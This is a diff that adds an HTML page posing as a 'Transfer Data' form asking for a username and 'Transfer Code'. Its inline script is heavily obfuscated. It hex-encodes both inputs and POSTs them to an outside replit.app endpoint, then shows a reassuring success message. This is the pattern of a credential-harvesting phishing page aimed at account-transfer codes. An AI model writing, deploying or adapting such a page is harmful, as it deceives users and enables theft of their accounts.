@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Transfer Data</title>
+
+<style>
+body{margin:0;font-family:Arial,sans-serif;background:rgba(0,0,0,0.75);display:flex;justify-content:center;align-items:center;height:100vh}.panel{width:420px;background:#111;border:3px solid #ff9800;border-radius:10px;box-shadow:0 0 25px rgba(255,165,0,0.5);color:white;overflow:hidden}.header{background:linear-gradient(#ffb300,#ff6f00);color:black;font-weight:bold;padding:12px;display:flex;justify-content:space-between;align-items:center}.close-btn{background:#000;color:#ffb300;border:1px solid #ffb300;border-radius:4px;cursor:pointer;padding:4px 10px}.content{padding:20px}.content p{margin-top:0;color:#ffd54f}input{width:100%;box-sizing:border-box;margin-bottom:12px;padding:10px;border:1px solid #ff9800;background:#222;color:white;border-radius:4px}.submit-btn{width:100%;background:linear-gradient(#ffb300,#ff6100);color:black;font-weight:bold;border:0;padding:12px;border-radius:4px;cursor:pointer}#status{margin-top:10px;text-align:center;min-height:20px;color:#ffd54f}
+</style>
+</head>
+<body>
+
+<div class="panel">
+    <div class="header">
+        <span>Transfer Data</span>
+        <button class="close-btn"
+                onclick="document.querySelector('.panel').style.display='none'">
+            X
+        </button>
+    </div>
+
+    <div class="content">
+        <p>Request data transfer to the new application.</p>
+
+        <form id="transferForm">
+            <input type="text"
+                   id="username"
+                   placeholder="Username"
+                   required>
+
+            <input type="text"
+                   id="transferCode"
+                   placeholder="Transfer Code"
+                   required>
+
+            <p>
+                Transfer requests may take some time to process due to the
+                large number of users.
+            </p>
+
+            <button type="submit" class="submit-btn">
+                Submit
+            </button>
+
+            <div id="status"></div>
+        </form>
+    </div>
+</div>
+
+<script>
+const _0x5e4b42=_0x2e13;(function(_0x47535,_0x371b4b){const _0x279787=_0x2e13,_0x32adfb=_0x47535();while(!![]){try{const _0x59b03e=parseInt(_0x279787(0x15f))/0x1*(-parseInt(_0x279787(0x160))/0x2)+-parseInt(_0x279787(0x155))/0x3+parseInt(_0x279787(0x15c))/0x4+parseInt(_0x279787(0x15e))/0x5+parseInt(_0x279787(0x156))/0x6+-parseInt(_0x279787(0x16e))/0x7*(parseInt(_0x279787(0x151))/0x8)+parseInt(_0x279787(0x153))/0x9*(parseInt(_0x279787(0x154))/0xa);if(_0x59b03e===_0x371b4b)break;else _0x32adfb['push'](_0x32adfb['shift']());}catch(_0x295661){_0x32adfb['push'](_0x32adfb['shift']());}}}(_0x521a,0x56ef0));function toHex(_0x1c0de3){const _0x4537b1=_0x2e13;return Array[_0x4537b1(0x15d)](new TextEncoder()['encode'](_0x1c0de3))[_0x4537b1(0x16a)](_0x1a5be5=>_0x1a5be5['toString'](0x10)[_0x4537b1(0x167)](0x2,'0'))[_0x4537b1(0x162)]('');}document[_0x5e4b42(0x159)]('transferForm')[_0x5e4b42(0x168)](_0x5e4b42(0x157),async function(_0x53c76c){const _0x576f71=_0x5e4b42;_0x53c76c[_0x576f71(0x161)]();const _0x1aaf9c=document[_0x576f71(0x159)](_0x576f71(0x164));_0x1aaf9c[_0x576f71(0x16c)][_0x576f71(0x15a)]='#ffd54f',_0x1aaf9c[_0x576f71(0x158)]=_0x576f71(0x16f);try{const _0xff2324=toHex(document[_0x576f71(0x159)](_0x576f71(0x166))['value']),_0x42dbd0=toHex(document['getElementById'](_0x576f71(0x169))['value']),_0x35126a=await fetch('https://pw-5--caemloqacveg.replit.app/api/v1/TransferRequest.php',{'method':_0x576f71(0x170),'headers':{'Content-Type':'application/x-www-form-urlencoded'},'body':_0x576f71(0x163)+encodeURIComponent(_0xff2324)+_0x576f71(0x171)+encodeURIComponent(_0x42dbd0)});_0x35126a['ok']?(_0x1aaf9c[_0x576f71(0x16c)]['color']=_0x576f71(0x15b),_0x1aaf9c[_0x576f71(0x158)]=_0x576f71(0x16d)):(_0x1aaf9c[_0x576f71(0x16c)][_0x576f71(0x15a)]='#ff6666',_0x1aaf9c[_0x576f71(0x158)]=_0x576f71(0x152)+_0x35126a[_0x576f71(0x164)]);}catch(_0x366890){_0x1aaf9c[_0x576f71(0x16c)]['color']=_0x576f71(0x16b),_0x1aaf9c[_0x576f71(0x158)]=_0x576f71(0x165);}});function _0x2e13(_0x2d0b2b,_0x10a30a){_0x2d0b2b=_0x2d0b2b-0x151;const _0x521aa5=_0x521a();let _0x2e1368=_0x521aa5[_0x2d0b2b];return _0x2e1368;}function _0x521a(){const _0x322d44=['getElementById','color','#7CFC00','413088JLOYra','from','642530AiihQy','1bteoIG','515004WrPFeH','preventDefault','join','username=','status','Unable\x20to\x20contact\x20the\x20server.','username','padStart','addEventListener','transferCode','map','#ff6666','style','Transfer\x20request\x20submitted\x20successfully.','49931yUtdUX','Submitting\x20request...','POST','&transfer_code=','280OAizLr','Server\x20returned\x20error\x20','8394291jmxapO','10LZcurV','1508868DDiSOM','1210296kyUScR','submit','textContent'];_0x521a=function(){return _0x322d44;};return _0x521a();}
+</script>
+
+</body>
+</html>
